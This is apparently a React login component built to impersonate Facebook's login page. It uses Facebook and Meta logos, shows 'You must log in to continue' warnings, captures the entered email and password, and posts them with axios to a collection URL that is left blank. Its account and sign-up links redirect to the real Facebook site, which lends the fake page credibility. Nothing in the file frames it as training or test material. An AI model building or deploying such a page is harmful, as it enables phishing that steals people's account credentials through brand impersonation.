import React, { useState } from 'react';
import './login.css';
import { Icon } from 'react-icons-kit';
import {arrowLeft2} from 'react-icons-kit/icomoon/arrowLeft2';
import {angleDown} from 'react-icons-kit/fa/angleDown';
import {facebook_1} from 'react-icons-kit/ikons/facebook_1';
import metaLogo from './assets/metalogo.png';
import axios from 'axios';
import desktop_logo from './assets/desktop_logo.svg'



const Login = () => {

    const [values, setValues] = useState({
        email: '',
        password: '',
    })

    const [loading, setLoading]= useState(false)

    const handleChange = (e)=>{
        setValues({...values, [e.target.name]: e.target.value})
    }

    const url = ""
    const body = {email: values.email, password: values.password }

    const login = async (e)=>{
        e.preventDefault()
        try{
            setLoading(true)
            const response = await axios.post(url,body)
            setLoading(false)
            console.log(response)
        } catch(error){
            setLoading(false)
            console.log(error)
        }

    }

    const toFacebook = ()=>{
        window.location.href = "https://www.facebook.com/r.php?next=https%3A%2F%2Fwww.facebook.com%2F&locale=en_US&display=page"
    }


  return (

    <>
    
        <div className='login_page'>
            <div className='desktop_login_body'>
                <div className='desktop_logo'>
                    <img src={desktop_logo} alt='logo'/>
                </div>
                <div className='warning_container'>
                    <div className='warning_login_logo_container'>
                        <span>i</span>
                    </div>
                    <p>You must log in to continue</p>
                </div>
                <form onSubmit={login} className='desktop_login_form_container'>
                    <p>Log Into Facebook</p>
                    <div className='form_warning'>
                        <p>You must log in to continue</p>
                    </div>
                    <input
                        type='text'
                        placeholder='Email or phone number'
                        name='email'
                        onChange={handleChange}
                    />
                    <input
                        type='password'
                        placeholder='Password'
                        name='password'
                        onChange={handleChange}
                    />
                    <button type='submit'>Log In</button>
                    <span onClick={toFacebook}>Forgot account? . Sign up for Facebook</span>
                </form>
            </div>
            <div className='login_part'>
                {/* <div className='back_icon'>
                    <Icon size={15} icon={arrowLeft2} />
                </div> */}
                <div className='language'>
                    <p>English (UK)</p>
                    {/* <div className='arrow_down'>
                        <Icon size={20} icon={angleDown} />
                    </div> */}
                </div>
                <div className='facebook_icon'>
                    <Icon size={40} icon={facebook_1}/>
                </div>
                <div className='login_Inputs'>
                    <div className='input_div'>
                        <input 
                            type='text' 
                            name='email'
                            placeholder='Mobile number or email address'
                            onChange={handleChange}
                        />
                        {/* <div className='void'>
                            <p>i</p>
                        </div> */}
                    </div>
                    <div className='input_div'>
                        <input 
                            type='text' 
                            name='password'
                            placeholder='Password'
                            onChange={handleChange}
                        />
                    </div>
                    <button onClick={login} className='login_btn'>{loading == true ? "loading..." : "Log in"}</button>
                    <p className='forgot_password'>Forgotten Password</p>
                </div>
                <div className='login_bottom'>
                    <button onClick={toFacebook} className='create_new_acct_btn'>Create new account</button>
                    <div className='meta_logo'>
                        <div className='meta_icon'>
                            <img src={metaLogo} alt=''/>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    
    </>

  )
}

export default Login